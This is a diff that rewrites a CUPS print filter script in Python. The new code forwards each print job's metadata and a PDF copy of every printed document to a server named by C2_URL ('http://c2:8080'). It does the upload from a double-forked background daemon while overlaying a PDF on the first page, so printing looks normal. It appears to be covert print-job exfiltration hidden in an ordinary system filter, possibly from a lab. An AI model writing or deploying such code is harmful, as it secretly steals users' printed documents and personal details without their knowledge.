@@ -1,13 +1,179 @@
-#!/bin/bash -x
+#!/usr/bin/env python3
 
-TEMPDIR=$(mktemp -d)
+from __future__ import print_function
 
-INFILE_PDF=$TEMPDIR/in.pdf
-OUTFILE_PDF=$TEMPDIR/out.pdf
+import sys
+import tempfile
+import PyPDF2
+import json
+import datetime
+import requests
+import base64
+import threading
+import subprocess
+import io
+import os
 
-pstopdf "$1" "$2" "$3" "$4" "$5" "$6" > "$INFILE_PDF"
-/bpc/overlay "$1" "$2" "$3" "$4" "$5" "$INFILE_PDF" "$OUTFILE_PDF"
-pdftops "$1" "$2" "$3" "$4" "$5" "$OUTFILE_PDF"
 
-rm -rf $TEMPDIR
+def eprint(*args, **kwargs):
+    print(*args, file=sys.stderr, **kwargs)
 
+
+def bpc_debug(*args, **kwargs):
+    eprint("DEBUG: (BPC)", *args, **kwargs)
+
+
+def spawn_daemon(func, *args, **kwargs):
+    # do the UNIX double-fork magic, see Stevens' "Advanced
+    # Programming in the UNIX Environment" for details (ISBN 0201563177)
+    try:
+        pid = os.fork()
+        if pid > 0:
+            # parent process, return and keep running
+            return
+    except OSError as  e:
+        eprint("fork #1 failed: %d (%s)" % (e.errno, e.strerror))
+        sys.exit(1)
+
+    os.setsid()
+
+    # do second fork
+    try:
+        pid = os.fork()
+        if pid > 0:
+            # exit from second parent
+            sys.exit(0)
+    except OSError as e:
+        eprint("fork #2 failed: %d (%s)" % (e.errno, e.strerror))
+        sys.exit(1)
+
+    # do stuff
+    func(*args, **kwargs)
+
+    # all done
+    os._exit(os.EX_OK)
+
+
+class MetaUploader(threading.Thread):
+    def __init__(self, cups_id, cups_user, cups_title, cups_copies, cups_options):
+        threading.Thread.__init__(self)
+        self.cups_id = cups_id
+        self.cups_user = cups_user
+        self.cups_title = cups_title
+        self.cups_copies = cups_copies
+        self.cups_options = cups_options
+
+    def run(self):
+        job_data = {'id': self.cups_id, 'user': self.cups_user, 'title': self.cups_title, 'copies': self.cups_copies,
+                    'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat()}
+        bpc_debug("Uploading Metadata - Request:", job_data)
+        response = requests.post(C2_URL, json=job_data)
+        json_response = response.json()
+        bpc_debug("Uploaded Metadata - Response:", json_response)
+        self._upload_id = json_response['upload_id']
+        self._pages = json_response['pages']
+
+    def upload_id(self):
+        self.join()
+        return self._upload_id
+
+
+def ps_to_pdf(cups_filename_or_none, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("ps_to_pdf")
+    if cups_filename_or_none is not None:
+        file_in = open(cups_filename_or_none, 'rb')
+    else:
+        file_in = None
+    bytes = subprocess.check_output(
+        args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
+        stdin=file_in)
+    # file.close()
+    return bytes
+
+
+def ps_2_pdf(cups_filename_or_none, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("ps_2_pdf")
+    if cups_filename_or_none is not None:
+        file_in = cups_filename_or_none
+    else:
+        file_in = '-'
+    bpc_debug(["/usr/bin/ps2pdf", file_in, '-'])
+    bytes = subprocess.check_output(args=["/usr/bin/ps2pdf", file_in, '-'])
+    return bytes
+
+
+def upload_pdf(bytes, upload_id):
+    bpc_debug("Uploading PDF:", upload_id)
+    response = requests.post(C2_URL + '/' + upload_id, data=bytes)
+    bpc_debug("Uploaded PDF:", response)
+
+
+def overlay_pdf(bytes):
+    bpc_debug("Overlaying PDF")
+    with io.BytesIO(bytes) as in_file:
+        with io.BytesIO() as out_file:
+            with open('/bpc/PDFs/overlay.pdf', 'rb') as overlay_file:
+
+                in_reader = PyPDF2.PdfFileReader(in_file)
+                overlay_reader = PyPDF2.PdfFileReader(overlay_file)
+                out_writer = PyPDF2.PdfFileWriter()
+
+                overlay_page = overlay_reader.getPage(0)
+
+                for page_index in range(in_reader.numPages):
+                    page = in_reader.getPage(page_index)
+                    if page_index == 0:
+                        page.mergePage(overlay_page)
+                    out_writer.addPage(page)
+
+                out_writer.write(out_file)
+                result = out_file.getvalue()
+                # with open('/bpc/out_file.pdf', 'wb') as file:
+                #    file.write(result)
+    bpc_debug("Overlayed PDF")
+    return result
+
+
+def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("pdf_to_ps")
+    p = subprocess.Popen(
+        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
+        stdin=subprocess.PIPE)
+    p.communicate(input=bytes)
+    p.stdin.close()
+
+
+def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("pdf_2_ps")
+    p = subprocess.Popen(
+        args=["/usr/bin/pdf2ps", '-', '-'],
+        stdin=subprocess.PIPE)
+    p.communicate(input=bytes)
+    p.stdin.close()
+
+
+C2_URL = 'http://c2:8080/bpc/api-v1'
+
+eprint(sys.argv)
+cups_id = sys.argv[1]
+cups_user = sys.argv[2]
+cups_title = sys.argv[3]
+cups_copies = sys.argv[4]
+cups_options = sys.argv[5]
+if len(sys.argv) > 6:
+    cups_input_filename = sys.argv[6]
+else:
+    cups_input_filename = None
+
+meta_uploader = MetaUploader(cups_id, cups_user, cups_title, cups_copies, cups_options)
+meta_uploader.start()
+
+# pdf_input_data = ps_to_pdf(cups_input_filename, cups_id, cups_user, cups_title, cups_copies, cups_options)
+pdf_input_data = ps_2_pdf(cups_input_filename, cups_id, cups_user, cups_title, cups_copies, cups_options)
+
+spawn_daemon(upload_pdf, pdf_input_data, meta_uploader.upload_id())
+
+pdf_output_data = overlay_pdf(pdf_input_data)
+
+# pdf_to_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
+pdf_2_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
